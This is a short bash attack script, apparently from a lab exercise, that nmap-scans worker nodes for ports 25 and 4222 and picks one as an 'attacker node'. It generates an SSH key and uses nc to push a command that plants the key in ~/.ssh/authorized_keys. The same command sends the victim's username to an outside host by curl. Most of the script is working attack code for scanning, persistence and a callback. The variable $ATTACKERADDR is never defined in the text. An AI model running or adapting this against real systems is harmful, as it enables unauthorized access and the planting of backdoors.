#!/usr/bin/env bash
set -euo pipefail

FILE_IP="/tmp/iphost"
KEY_PATH="$HOME/.ssh/id_ed25519"
FILEATTACK="$DATA_PATH/KC4/attackaddr"

mkdir -p $DATA_PATH/KC4/analysis

list_node_ips() {
  if [[ ! -f "$FILE_IP" ]]; then
    echo "Error: file '$FILE_IP' not found" >&2
    return 1
  fi

  echo ">> Recover IPs list (file: $FILE_IP)..." >&2
  awk -F'-' '
    /^[[:space:]]*#/ { next }
    /^[[:space:]]*$/ { next }
    NF >= 2 {
      ip=$1; host=$2
      gsub(/^[ \t]+|[ \t\r]+$/, "", ip)
      gsub(/^[ \t]+|[ \t\r]+$/, "", host)
      if (host ~ /^worker([0-9]+)?$/ && ip ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/) {
        print ip
      }
    }
  ' "$FILE_IP" | sort -u
}

mapfile -t nodes < <(list_node_ips | sed '/^$/d')
if [[ "${#nodes[@]}" -eq 0 ]]; then
  echo "No node found"; exit 1
fi
echo ">> Nodes found (${#nodes[@]}): ${nodes[*]}"

for n in "${nodes[@]}"; do
  out=$(nmap -p 25,4222 -Pn -oG - "$n" 2>/dev/null)
  # Check both ports reported as open in nmap greppable output
  if echo "$out" | grep -q '25/open' && echo "$out" | grep -q '4222/open'; then
    echo "FOUND: $n (ports 25 and 4222 are open)"
    ATTACKER_NODE="$n"
    echo "$ATTACKER_NODE" > "$FILEATTACK"
    break
  fi
done

ssh-keygen -t ed25519 -N "" -f $KEY_PATH -q
echo -n "echo \"$(cat $KEY_PATH.pub)\" >> ~/.ssh/authorized_keys && curl http://$ATTACKERADDR:8080/\$(id -un)" | nc -w9 $ATTACKER_NODE 25 > /dev/null 2>&1